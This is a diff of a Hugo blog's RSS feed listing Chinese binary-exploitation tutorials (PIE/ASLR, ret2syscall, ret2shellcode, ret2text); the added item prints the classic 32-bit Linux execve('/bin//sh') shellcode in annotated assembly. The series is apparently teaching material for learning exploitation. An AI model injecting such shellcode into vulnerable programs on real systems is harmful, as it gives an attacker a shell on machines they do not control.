@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on lhon901's blog</title><link>/posts/</link><description>Recent content in Posts on lhon901's blog</description><generator>Hugo</generator><language>zh-CN</language><lastBuildDate>Fri, 11 Jul 2025 22:32:51 +0800</lastBuildDate><atom:link href="/posts/rss.xml" rel="self" type="application/rss+xml"/><item><title>从零开始的 Pwn 之旅 - PIE 和 ALSR</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---pie-%E5%92%8C-alsr/</link><pubDate>Fri, 11 Jul 2025 22:15:52 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---pie-%E5%92%8C-alsr/</guid><description>&lt;h2 id="前言">前言
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on lhon901's blog</title><link>/posts/</link><description>Recent content in Posts on lhon901's blog</description><generator>Hugo</generator><language>zh-CN</language><lastBuildDate>Fri, 11 Jul 2025 23:25:27 +0800</lastBuildDate><atom:link href="/posts/rss.xml" rel="self" type="application/rss+xml"/><item><title>从零开始的 Pwn 之旅 - PIE 和 ALSR</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---pie-%E5%92%8C-alsr/</link><pubDate>Fri, 11 Jul 2025 22:15:52 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---pie-%E5%92%8C-alsr/</guid><description>&lt;h2 id="前言">前言
 &lt;a class="header-anchor" href="#%e5%89%8d%e8%a8%80">&lt;/a>
 &lt;/h2>&lt;ul>
 &lt;li>PIE（Position Independent Executable）和ASLR（Address Space Layout Randomization）是现代操作系统中常用的安全机制。通过随机化程序的内存布局，PIE和ASLR可以有效地防止攻击者利用已知的内存地址进行攻击。&lt;/li>
@@ -68,7 +68,40 @@
 &lt;/h2>&lt;p>当使用 ida pro 逆向分析时，函数开头总有这么一段：&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - Ret2syscall</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2syscall/</link><pubDate>Sat, 28 Jun 2025 17:22:01 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2syscall/</guid><description>&lt;h2 id="前言">前言
 &lt;a class="header-anchor" href="#%e5%89%8d%e8%a8%80">&lt;/a>
 &lt;/h2>&lt;p>ret2syscall 是 Pwn 进阶中的一个重要概念，它允许我们通过修改返回地址来直接调用系统调用，从而实现更复杂的攻击。本文将介绍 ret2syscall 的基本原理和应用。&lt;/p>
-&lt;p>C 语言中的 &lt;code>puts&lt;/code> &lt;code>read&lt;/code> &lt;code>write&lt;/code> 等函数实际上是对系统调用的封装。通过 ret2syscall，我们可以直接调用这些系统调用，而不需要依赖 libc 函数。&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - Ret2shellcode</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2shellcode/</link><pubDate>Fri, 27 Jun 2025 22:49:50 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2shellcode/</guid><description>&lt;h2 id="前言">前言
+&lt;p>C 语言中的 &lt;code>puts&lt;/code> &lt;code>read&lt;/code> &lt;code>write&lt;/code> 等函数实际上是对系统调用的封装。通过 ret2syscall，我们可以直接调用这些系统调用，而不需要依赖 libc 函数。&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - Ret2shellcode 进阶</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2shellcode-%E8%BF%9B%E9%98%B6/</link><pubDate>Sat, 28 Jun 2025 16:46:27 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2shellcode-%E8%BF%9B%E9%98%B6/</guid><description>&lt;h2 id="手写-shellcode">手写 shellcode
+&lt;a class="header-anchor" href="#%e6%89%8b%e5%86%99-shellcode">&lt;/a>
+&lt;/h2>&lt;p>这里给出最经典的 shellcode&lt;/p>
+
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt" id="hl-0-1">&lt;a class="lnlinks" href="#hl-0-1"> 1&lt;/a>
+&lt;/span>&lt;span class="lnt" id="hl-0-2">&lt;a class="lnlinks" href="#hl-0-2"> 2&lt;/a>
+&lt;/span>&lt;span class="lnt" id="hl-0-3">&lt;a class="lnlinks" href="#hl-0-3"> 3&lt;/a>
+&lt;/span>&lt;span class="lnt" id="hl-0-4">&lt;a class="lnlinks" href="#hl-0-4"> 4&lt;/a>
+&lt;/span>&lt;span class="lnt" id="hl-0-5">&lt;a class="lnlinks" href="#hl-0-5"> 5&lt;/a>
+&lt;/span>&lt;span class="lnt" id="hl-0-6">&lt;a class="lnlinks" href="#hl-0-6"> 6&lt;/a>
+&lt;/span>&lt;span class="lnt" id="hl-0-7">&lt;a class="lnlinks" href="#hl-0-7"> 7&lt;/a>
+&lt;/span>&lt;span class="lnt" id="hl-0-8">&lt;a class="lnlinks" href="#hl-0-8"> 8&lt;/a>
+&lt;/span>&lt;span class="lnt" id="hl-0-9">&lt;a class="lnlinks" href="#hl-0-9"> 9&lt;/a>
+&lt;/span>&lt;span class="lnt" id="hl-0-10">&lt;a class="lnlinks" href="#hl-0-10">10&lt;/a>
+&lt;/span>&lt;span class="lnt" id="hl-0-11">&lt;a class="lnlinks" href="#hl-0-11">11&lt;/a>
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">xor&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c1">; eax = 0
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">push&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c1">; push 0 (null terminator)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">push&lt;/span> &lt;span class="mi">0x68732f2f&lt;/span> &lt;span class="c1">; push &amp;#34;//sh&amp;#34;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">push&lt;/span> &lt;span class="mi">0x6e69622f&lt;/span> &lt;span class="c1">; push &amp;#34;/bin&amp;#34;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">mov&lt;/span> &lt;span class="no">ebx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">esp&lt;/span> &lt;span class="c1">; ebx = pointer to &amp;#34;/bin//sh&amp;#34;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">push&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c1">; push 0 (argv[1] = NULL)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">mov&lt;/span> &lt;span class="no">edx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">esp&lt;/span> &lt;span class="c1">; edx = pointer to NULL
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">push&lt;/span> &lt;span class="no">ebx&lt;/span> &lt;span class="c1">; push pointer to &amp;#34;/bin//sh&amp;#34;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">mov&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">esp&lt;/span> &lt;span class="c1">; ecx = pointer to argv
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">mov&lt;/span> &lt;span class="no">al&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0xb&lt;/span> &lt;span class="c1">; syscall number for execve
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">int&lt;/span> &lt;span class="mi">0x80&lt;/span> &lt;span class="err">;&lt;/span> &lt;span class="no">trigger&lt;/span> &lt;span class="no">syscall&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+
+&lt;p>最经典的 Linux x86（32位）shellcode，它的作用是执行 /bin/sh（获得 shell）&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - Ret2shellcode</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2shellcode/</link><pubDate>Fri, 27 Jun 2025 22:49:50 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2shellcode/</guid><description>&lt;h2 id="前言">前言
 &lt;a class="header-anchor" href="#%e5%89%8d%e8%a8%80">&lt;/a>
 &lt;/h2>&lt;p>ret2shellcode 即是将程序的控制流劫持到我们构造的 shellcode 上。shellcode 是一段可以被执行的代码，通常用于执行系统命令或打开一个 shell。&lt;/p>
 &lt;p>想要执行 sehllcode, shellcode 所在的内存区域必须是可执行的。&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - Ret2text</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2text/</link><pubDate>Wed, 25 Jun 2025 14:32:23 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2text/</guid><description>&lt;h2 id="前言">前言
